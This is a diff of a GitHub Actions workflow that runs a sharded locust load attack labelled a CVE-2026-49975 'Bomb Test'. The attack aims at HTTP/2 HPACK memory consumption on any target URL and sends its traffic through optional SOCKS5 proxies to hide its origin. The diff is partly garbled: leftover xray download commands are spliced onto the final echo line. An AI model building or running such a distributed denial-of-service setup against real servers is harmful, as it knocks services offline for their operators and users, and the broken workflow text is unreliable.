@@ -1,4 +1,4 @@
-name: CVE-2026-49975 + VLESS 代理测试
+name: CVE-2026-49975 分布式内存消耗测试
 
 on:
   workflow_dispatch:
@@ -6,7 +6,7 @@ on:
       target_url:
         description: '1. 目标 URL'
         required: true
-        default: 'https://your-nginx-server.com'
+        default: 'https://your-target.com'
       threads_per_shard:
         description: '2. 每个分片的并发线程数'
         required: true
@@ -27,21 +27,8 @@ on:
         description: '6. 连接保持秒数'
         required: false
         default: '15'
-      vless_uri:
-        description: '7. VLESS URI (vless://开头)'
-        required: false
-        default: ''
-      # VLESS 手动配置（如果上面 URI 为空）
-      vless_server:
-        description: '8. VLESS 服务器地址（备用）'
-        required: false
-        default: ''
-      vless_port:
-        description: '9. VLESS 端口（备用）'
-        required: false
-        default: ''
-      vless_uuid:
-        description: '10. VLESS UUID（备用）'
+      proxy_url:
+        description: '7. 代理地址（留空则直连）'
         required: false
         default: ''
 
@@ -79,12 +66,21 @@ jobs:
           pip install locust==2.32.2
           pip install PySocks
 
-      # ===== 启动 xray-core 转发 VLESS =====
-      - name: Setup xray-core
-        if: inputs.vless_uri != '' || inputs.vless_server != ''
+      - name: Run CVE-2026-49975 Bomb Test
         run: |
-          # 下载 xray-core
-          curl -L https://github.com/XTLS/Xray-core/releases/latest/download/Xray-linux-64.zip -o xray.zip
+          locust -f locustfile.py \
+            --headless \
+            -u ${{ github.event.inputs.threads_per_shard }} \
+            -r ${{ github.event.inputs.threads_per_shard }} \
+            --run-time ${{ github.event.inputs.run_time_minutes }}m \
+            --host ${{ github.event.inputs.target_url }}
+        env:
+          LOCUST_REFERENCES: ${{ github.event.inputs.hpack_references }}
+          LOCUST_HOLD_SECONDS: ${{ github.event.inputs.hold_seconds }}
+          SOCKS5_PROXY: ${{ github.event.inputs.proxy_url }}
+
+      - name: Shard Complete
+        run: echo "Shard ${{ matrix.shard }} 完成"ux-64.zip -o xray.zip
           unzip -o xray.zip xray -d /usr/local/bin/
           chmod +x /usr/local/bin/xray
           xray version
